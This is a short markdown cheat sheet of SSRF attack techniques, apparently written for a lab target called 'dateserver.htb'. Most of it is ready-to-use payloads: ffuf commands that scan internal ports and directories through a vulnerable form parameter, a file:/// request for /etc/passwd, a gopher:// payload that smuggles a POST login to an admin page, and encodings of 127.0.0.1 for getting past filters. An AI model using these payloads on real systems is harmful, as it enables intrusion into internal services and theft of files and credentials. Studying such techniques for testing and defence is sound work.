FFUF to fuzz ports using SSRF. Make a port list like 
```CLI
seq 1-10000> ports.txt
```

## Payloads
```CLI
ffuf -w ./ports.txt -u http://172.17.0.2/index.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "dateserver=http://127.0.0.1:FUZZ/&date=2024-01-01" -fr "Failed to connect to"
```


#### Directory fuzzing

```CLI
ffuf -w /opt/SecLists/Discovery/Web-Content/raft-small-words.txt -u http://172.17.0.2/index.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "dateserver=http://dateserver.htb/FUZZ.php&date=2024-01-01" -fr "Server at dateserver.htb Port 80"
```

#### Local File Inclusion (LFI)

```
file:///etc/passwds
```

## Restricted Logins

To send POST request via SSRF to login pages, you need to convert the http request to gopher.

1) Grab the HTTP request:
```HTTP
POST /admin.php HTTP/1.1
Host: dateserver.htb
Content-Length: 13
Content-Type: application/x-www-form-urlencoded

adminpw=admin
```

2) Then you have to conver to the gopher version for HTTP:
```CLI
gopher://dateserver.htb:80/_POST%20/admin.php%20HTTP%2F1.1%0D%0AHost:%20dateserver.htb%0D%0AContent-Length:%2013%0D%0AContent-Type:%20application/x-www-form-urlencoded%0D%0A%0D%0Aadminpw%3Dadmin
```

3) Then because the gopher payload is being used within an http payload, it will have to be url encoded one more time then can be used as a payload like dateserver=<payload>.

## SSRF Bypasses

 - Use an alternative IP representation of 127.0.0.1, such as 2130706433, 017700000001, or 127.1.
- Register your own domain name that resolves to 127.0.0.1. You can use spoofed.burpcollaborator.net for this purpose.
